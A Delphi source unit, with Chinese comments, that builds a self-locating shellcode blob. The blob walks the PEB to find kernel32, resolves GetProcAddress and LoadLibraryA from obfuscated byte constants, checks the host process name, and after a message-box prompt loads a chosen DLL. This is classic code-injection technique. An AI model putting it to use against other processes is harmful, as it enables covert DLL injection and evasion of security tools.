unit UMPE;

interface
uses windows, sysutils, classes;

function MakeSpyCode (AppList: TStrings; DLLToLoad: String;
                      MsgCaption: String; MsgText: TStrings;
                      out CodeBase: Pointer; out CodeSize: DWORD): LongBool;

implementation

uses RelocFuncUnit, GlobalType, PEHead;

//\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
// 关键可复制代码
//\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

Const
  UMPE_HEAD_SIGN = 'UMPE';

Type
  LPTParameter = ^TParameter;
  TParameter = packed record
  end;

  LPTGlobalVar = ^TGlobalVar;
  TGlobalVar = packed record
  end;

  LPTImportTable = ^TImportTable;
  TImportTable = packed record
    GetProcAddress: function (hModule: HMODULE; lpProcName: LPCSTR): FARPROC; stdcall;
    LoadLibraryA: function (lpLibFileName: PAnsiChar): HMODULE; stdcall;
    FreeLibrary: function (hLibModule: HMODULE): BOOL; stdcall;
    OutputDebugStringA: procedure (lpOutputString: PAnsiChar); stdcall;
    GetModuleFileNameA: function (hModule: HINST; lpFilename: PAnsiChar; nSize: DWORD): DWORD; stdcall;
    MessageBoxA: function (hWnd: HWND; lpText, lpCaption: PAnsiChar; uType: UINT): Integer; stdcall;
    ExitThread: procedure (dwExitCode: DWORD); stdcall;
  end;

  LPTCodeTable = ^TCodeTable;
  TCodeTable = packed record
    GetKernel32Base: function: Pointer;
    GetPrimeFunction: function (Kernel32Module:Cardinal; var GetProcAddress, LoadlibraryA:Pointer) : LongBool; stdcall;
    StrLen: function (const Str: PChar): Cardinal;
    LineLen: function (Const Str: PChar): Cardinal;
    UpCase: function ( ch : Char ) : Char;
    CompareMem: function (P1, P2: Pointer; Length: Integer): Boolean;
  end;

  LPTDataTable = ^TDataTable;
  TDataTable = packed record
    sUser32: PChar;
    sAppList: PChar;
    sFreeLibrary: PChar;
    sExitThread: PChar;
    sOutputDebugStringA: PChar;
    sGetModuleFileNameA: PChar;
    sMessageBoxA: PChar;
    sMsgCaption: PChar;
    sMsgText: PChar;
    sDLLToLoad: PChar;
    sNull: Pointer;
  end;

  LPTBuildinDataStru = ^TBuildinDataStru;
  TBuildinDataStru = packed record
    SIGN: Array[0..3] of char;
    Size: Integer;
    Parameter: TParameter;
    GlobalVar: TGlobalVar;
    ImportTable: TImportTable;
    CodeTable: TCodeTable;
    DataTable: TDataTable;
    MainEntry: Array[0..0] of char;
  end;

Type
  LPTRelocArray = ^TRelocArray;
  TRelocArray = Array[byte] of DWORD;


  
Procedure LeaderCode; Stdcall;
var
  BuildinData: LPTBuildinDataStru;
  RelocA: LPTRelocArray;
  Index: Integer;
  hKernel32, hUser32: THandle;
  FImport: LPTImportTable;
  FCode: LPTCodeTable;
  FData: LPTDataTable;
  AppName: Array[Byte] of char;
  AppNameLen: Integer;
  AimSample: PChar;
  AimSampleLen: Integer;
  MsgBoxRet: Integer;
begin
  //找出内嵌的守护代码和大小
  asm
      Call @Next
    @Start:
      DD  $AAAAAAAA
      DD  $AAAAAAAA
    @Next:
      Pop  BuildinData
  end;

  //对守护代码的资源从定位
  RelocA := @BuildinData.CodeTable;
  for Index := 0 to ((SizeOf (TCodeTable) + SizeOf (TDataTable)) div 4) - 1 do
    Inc (RelocA[Index], Integer(BuildinData));

  FCode := @BuildinData.CodeTable;
  FData := @BuildinData.DataTable;
  FImport:= @BuildinData.ImportTable;

  //处理输入表
  With FImport^ do
  begin
    hKernel32 := THandle(FCode.GetKernel32Base());
    if not FCode.GetPrimeFunction(hKernel32, @GetProcAddress, @LoadLibraryA) then exit;
    @OutputDebugStringA := GetProcAddress(hKernel32, FData.sOutputDebugStringA);
    @GetModuleFileNameA := GetProcAddress(hKernel32, FData.sGetModuleFileNameA);
    @FreeLibrary := GetProcAddress(hKernel32, FData.sFreeLibrary);
    @ExitThread  := GetProcAddress(hKernel32, FData.sExitThread);

    hUser32 := LoadLibraryA (FData.sUser32);
    @MessageBoxA := GetProcAddress(hUser32, FData.sMessageBoxA);
    FreeLibrary (hUser32);
  end;

  AppNameLen := FImport.GetModuleFileNameA (0, AppName, 256);
  for Index := 0 to 255 do
  begin
    if AppName[Index] = #0 then Break;    
    AppName[Index] := FCode.UpCase (AppName[Index]);
  end;

  if FData.sAppList <> FData.sNull then
  begin
    AimSample := FData.sAppList;
    AimSampleLen := FCode.LineLen (AimSample);
    Repeat
      if AppNameLen = AimSampleLen then
        if FCode.CompareMem (@AppName[0], AimSample, AppNameLen) then
        begin   
          if FData.sDLLToLoad <> FData.sNull then
          begin
            MsgBoxRet := FImport.MessageBoxA (0, FData.sMsgText, FData.sMsgCaption, MB_YESNOCANCEL);
            if IDYES = MsgBoxRet then
              FImport.LoadLibraryA (FData.sDLLToLoad)
          end else
          begin
            MsgBoxRet := FImport.MessageBoxA (0, FData.sMsgText, FData.sMsgCaption, MB_OKCANCEL);
          end;

          if IDCANCEL = MsgBoxRet then
            FImport.ExitThread (0);
          Exit;
        End;

      Inc (AimSample, AimSampleLen);
      if AimSample^ = #0 then Break;
      Inc (AimSample, 2);
      if AimSample^ = #0 then Break;

      AimSampleLen := FCode.LineLen (AimSample);

    until AimSampleLen < 8;
  end;
end;

Procedure LeaderCode_End;
begin
end;


function GetKernel32Base: Pointer;
var
  m_Peb   :PPeb;
  ListEntry :PListEntry;
begin
  asm
    mov eax,fs:[$30]
    mov m_Peb, eax
  end;
  ListEntry := m_Peb.Ldr.InInitializationOrderModuleList.Flink.Flink;
  result := PPointer ( DWORD(ListEntry) + SizeOf(TListEntry))^;
end;
procedure GetKernel32Base_End; begin end;

FUNCTION GetPrimeFunction(Kernel32Module:Cardinal; var GetProcAddress, LoadlibraryA:Pointer) : LongBool; stdcall;
VAR
  ExportName           : pChar;
  Address              : Cardinal;
  J                    : Cardinal;
  ImageDosHeader       : PImageDosHeader;
  ImageNTHeaders       : PImageNTHeaders;
  ImageExportDirectory : PImageExportDirectory;
  LoadlibraryAStr      : array[0..12] of char;
  fnGetProcAddress     : function (hModule: HMODULE; lpProcName: LPCSTR): FARPROC; stdcall;
BEGIN
  result := false;
  ImageDosHeader:=Pointer(Kernel32Module);
  ImageNTHeaders:=Pointer(Kernel32Module+ImageDosHeader.LFAOffset);
  ImageExportDirectory:=Pointer(ImageNtHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress+Kernel32Module);
  J:=0;
  Address:=0;
  REPEAT
    ExportName:=Pointer(Cardinal(Pointer(Cardinal(ImageExportDirectory.AddressOfNames)+Kernel32Module+J*4)^)+Kernel32Module);

    //判断是不是GetProcAddress字符串
    if PDWORD(@ExportName[0])^ = $50746547 then
    if PDWORD(@ExportName[4])^ = $41636F72 then
    if PDWORD(@ExportName[8])^ = $65726464 then
    if PWORD(@ExportName[12])^ = $7373 then
    if ExportName[14] = #0 then
    BEGIN
      Address:=Cardinal(Pointer(Word(Pointer(J SHL 1+Cardinal(
               ImageExportDirectory.AddressOfNameOrdinals)+Kernel32Module)^) AND
               $0000FFFF SHL 2+Cardinal(ImageExportDirectory.AddressOfFunctions)
               +Kernel32Module)^)+Kernel32Module;
    END;
    Inc(J);
  UNTIL (Address<>0)OR(J=ImageExportDirectory.NumberOfNames);

  if Address = 0 then exit;      

  PDWORD(@LoadlibraryAStr[0])^ := $64616F4C;
  PDWORD(@LoadlibraryAStr[4])^ := $7262694C;
  PDWORD(@LoadlibraryAStr[8])^ := $41797261;
  LoadlibraryAStr[12] := #0;

  GetProcAddress := Pointer(Address);
  fnGetProcAddress := GetProcAddress;
  LoadlibraryA := fnGetProcAddress(Kernel32Module, LoadlibraryAStr);

  Result:= Assigned(LoadlibraryA);
END;
procedure GetPrimeFunction_end; begin end;


function StrEnd(const Str: PChar): PChar;
asm
        MOV     EDX,EDI
        MOV     EDI,EAX
        MOV     ECX,0FFFFFFFFH
        XOR     AL,AL
        REPNE   SCASB
        LEA     EAX,[EDI-1]
        MOV     EDI,EDX
end;
procedure StrEnd_end; begin end;

function StrLen(const Str: PChar): Cardinal;
asm
        MOV     EDX,EDI
        MOV     EDI,EAX
        MOV     ECX,0FFFFFFFFH
        XOR     AL,AL
        REPNE   SCASB
        MOV     EAX,0FFFFFFFEH
        SUB     EAX,ECX
        MOV     EDI,EDX
end;
procedure StrLen_end; begin end;

function LineLen (Const Str: PChar): Cardinal;
var
  Scan: PByte;
begin
  Scan := @Str[0];
  Repeat
    Inc (Scan);
  until (Scan^ = $0) or (Scan^ = $D) or (Scan^ = $A);
  Result := DWORD(Scan) - DWORD(Str);
end;
procedure LineLen_end; begin end;

function UpCase( ch : Char ) : Char;
begin
  Result := ch;
  case Result of
    'a'..'z':  Dec(Result, Ord('a') - Ord('A'));
  end;
end;
procedure UpCase_end; begin end;

function CompareMem(P1, P2: Pointer; Length: Integer): Boolean; assembler;
asm
   add   eax, ecx
   add   edx, ecx
   xor   ecx, -1
   add   eax, -8
   add   edx, -8
   add   ecx, 9
   push  ebx
   jg    @Dword
   mov   ebx, [eax+ecx]
   cmp   ebx, [edx+ecx]
   jne   @Ret0
   lea   ebx, [eax+ecx]
   add   ecx, 4
   and   ebx, 3
   sub   ecx, ebx
   jg    @Dword
@DwordLoop:
   mov   ebx, [eax+ecx]
   cmp   ebx, [edx+ecx]
   jne   @Ret0
   mov   ebx, [eax+ecx+4]
   cmp   ebx, [edx+ecx+4]
   jne   @Ret0
   add   ecx, 8
   jg    @Dword
   mov   ebx, [eax+ecx]
   cmp   ebx, [edx+ecx]
   jne   @Ret0
   mov   ebx, [eax+ecx+4]
   cmp   ebx, [edx+ecx+4]
   jne   @Ret0
   add   ecx, 8
   jle   @DwordLoop
@Dword:
   cmp   ecx, 4
   jg    @Word
   mov   ebx, [eax+ecx]
   cmp   ebx, [edx+ecx]
   jne   @Ret0
   add   ecx, 4
@Word:
   cmp   ecx, 6
   jg    @Byte
   movzx ebx, word ptr [eax+ecx]
   cmp   bx, [edx+ecx]
   jne   @Ret0
   add   ecx, 2
@Byte:
   cmp   ecx, 7
   jg    @Ret1
   movzx ebx, byte ptr [eax+7]
   cmp   bl, [edx+7]
   jne   @Ret0
@Ret1:
   mov   eax, 1
   pop   ebx
   ret
@Ret0:
   xor   eax, eax
   pop   ebx
end;
procedure CompareMem_End; begin end;


//\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
// 组装代码的函数
//\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

function GetCopyValue (var HeadBase: PChar; var HeadSize: Integer;
                        var SizeOffset: Integer;
                        var TailBase: PChar; var TailSize: Integer): LongBool;
var
  IterPtr: PChar;
  SampleStart, SampleEnd: Pointer;
begin
  SampleStart := @LeaderCode;
  SampleEnd   := @LeaderCode_End;

  HeadBase := SampleStart;

  Result := False;
  IterPtr := HeadBase;
  Repeat
    if PInt64(IterPtr)^ = $AAAAAAAAAAAAAAAA then
    begin
      Result := True;
      Break;
    end;
    Inc (IterPtr);
  until IterPtr = @LeaderCode_End;

  if Result then
  begin
    HeadSize := Integer(IterPtr) - Integer(HeadBase);
    SizeOffset := HeadSize - 4;
    TailBase := Pointer (Integer(HeadBase) + HeadSize + SizeOf(Int64));
    TailSize := Integer (SampleEnd) - Integer(TailBase);
  end;
end;


function MakeSpyCode (AppList: TStrings; DLLToLoad: String;
                      MsgCaption: String; MsgText: TStrings;
                      out CodeBase: Pointer; out CodeSize: DWORD): LongBool;
var
  HeadBase: PChar;  HeadSize: Integer;
  SizeOffset: Integer;
  TailBase: PChar;  TailSize: Integer;
  BuildinData: TBuildinDataStru;
  CodeMM: TMemoryStream;
  BuildMM: TMemoryStream;
  FCode: LPTCodeTable;
  FData: LPTDataTable;
  function FillFuncTable (FuncStart, FuncEnd: Pointer): Pointer;
  begin
    Result := Pointer(BuildMM.Size);
    BuildMM.WriteBuffer(FuncStart^, Integer (FuncEnd) - Integer (FuncStart));
  end;
  function FillStringTable (ResStr: String): Pointer;
  begin
    Result := Pointer(BuildMM.Size);
    ResStr := ResStr + #0;
    BuildMM.WriteBuffer(PChar(ResStr)^, Length(ResStr));
  end;
begin
  Result := False;
  BuildMM := TMemoryStream.Create;
  BuildMM.Seek(0, soFromBeginning);

  //构造内嵌数据
  ZeroMemory (@BuildinData, SizeOf(TBuildinDataStru));
  BuildinData.SIGN := 'UMPE';
  BuildMM.WriteBuffer(BuildinData, SizeOf(TBuildinDataStru));

  //在内嵌数据里填入内置函数和函数表
  FCode := @LPTBuildinDataStru(BuildMM.Memory).CodeTable;

  @FCode.GetKernel32Base :=  FillFuncTable (@GetKernel32Base, @GetKernel32Base_End);
  @FCode.GetPrimeFunction :=  FillFuncTable (@GetPrimeFunction, @GetPrimeFunction_End);
  @FCode.StrLen :=  FillFuncTable (@StrLen, @StrLen_End);
  @FCode.LineLen := FillFuncTable (@LineLen, @LineLen_End);
  @FCode.CompareMem :=  FillFuncTable (@CompareMem, @CompareMem_End);
  @FCode.UpCase :=  FillFuncTable (@UpCase, @UpCase_End);

  //在内嵌数据里填入字符串资源
  FData := @LPTBuildinDataStru(BuildMM.Memory).DataTable; 
                            
  FData.sAppList := FillStringTable (AppList.Text);
  FData.sMsgCaption := FillStringTable (MsgCaption);
  FData.sMsgText := FillStringTable (MsgText.Text);
  if FileExists (DLLToLoad) then
    FData.sDLLToLoad := FillStringTable (DLLToLoad);

  FData.sUser32 := FillStringTable ('user32.dll');
  FData.sFreeLibrary := FillStringTable ('FreeLibrary');
  FData.sOutputDebugStringA := FillStringTable ('OutputDebugStringA');
  FData.sGetModuleFileNameA := FillStringTable ('GetModuleFileNameA');
  FData.sExitThread := FillStringTable ('ExitThread');
  FData.sMessageBoxA := FillStringTable ('MessageBoxA');

  //准备被复制，投入使用
  LPTBuildinDataStru(BuildMM.Memory).Size := BuildMM.Size;
  BuildMM.Seek(0, soFromBeginning);

  if GetCopyValue (HeadBase, HeadSize, SizeOffset, TailBase, TailSize) then
  begin
      CodeMM := TMemoryStream.Create;
      CodeMM.Seek(0, soFromBeginning);

      CodeMM.WriteBuffer(HeadBase^, HeadSize); //复制引导代码头节
      CodeMM.CopyFrom(BuildMM, BuildMM.Size);  //复制内嵌数据段
      CodeMM.WriteBuffer(TailBase^, TailSize); //复制引导代码尾节

      PInteger (@PChar(CodeMM.Memory)[SizeOffset])^ := BuildMM.Size; //修正跳转偏移

      CodeSize := CodeMM.Size;
      CodeBase := AllocMem (CodeSize);
      CopyMemory (CodeBase, CodeMM.Memory, CodeSize);
      CodeMM.Free;

      Result := True;
  end;

  BuildMM.Free;
end;


end.
